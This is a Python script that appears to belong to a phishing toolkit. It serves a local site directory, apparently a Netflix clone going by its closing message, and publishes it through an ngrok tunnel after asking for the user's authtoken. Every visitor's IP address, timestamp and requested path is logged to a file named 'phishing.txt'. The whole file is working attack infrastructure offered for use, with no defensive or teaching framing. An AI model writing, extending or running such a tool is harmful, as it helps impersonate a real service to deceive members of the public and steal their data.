import os  # Import the os module for operating system related functionalities
import subprocess  # Import subprocess module to spawn new processes
import time  # Import time module for time-related functions
import json  # Import json module for JSON manipulation
from http.server import SimpleHTTPRequestHandler, HTTPServer  # Import classes for HTTP server functionality
from rich.prompt import Prompt # For color
from rich import print # For color 



def service(website_dir):
    def start_ngrok():

        authtoken = str(Prompt.ask("\n\n[yellow][+] Insert your Ngrok authtoken :  ")) # insert authtoken 

        ngrok_authProcess = subprocess.Popen(['ngrok', 'authtoken', authtoken]) # NGROK authtoken 

        ngrok_process = subprocess.Popen(['ngrok', 'http', '80']) # Start NGROK in the background

        time.sleep(2) # Wait a bit to ensure NGROK is ready

        # Get the public URL generated by NGROK
        ngrok_url = None
        with subprocess.Popen(['curl', 'http://localhost:4040/api/tunnels'], stdout=subprocess.PIPE) as process:
            output = process.stdout.read()
            ngrok_url = output.decode('utf-8')

        # Extract URL from JSON response
        ngrok_url = json.loads(ngrok_url)['tunnels'][0]['public_url']

        return ngrok_process, ngrok_url

    # Handles HTTP requests and logs them into a file
    class RequestHandler(SimpleHTTPRequestHandler):
        def do_GET(self):
            with open('phishing.txt', 'a') as f:
                f.write(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {self.path}\n")
            SimpleHTTPRequestHandler.do_GET(self)

    # Ensure the directory exists
    if not os.path.isdir(website_dir):
        print("The website directory does not exist.")
        return

    os.chdir(website_dir) # Change working directory to the website directory

    
    ngrok_process, ngrok_url = start_ngrok() # Start NGROK
    print(f"NGROK is running at address: {ngrok_url}") 

    try:
        http_server = HTTPServer(('localhost', 80), RequestHandler) # Start a local HTTP server using Python

        print("[yellow][+] Local HTTP server started.")

        http_server.serve_forever() # Keep the program running until the user presses CTRL+C


    except KeyboardInterrupt:
        print("[red][-] Closing NGROK server and local HTTP server...")
        print("[yellow][+] Go to see netflix directory in phishing.txt...")
        
        ngrok_process.terminate() # Terminate NGROK

        
        http_server.server_close() # Close the local HTTP server
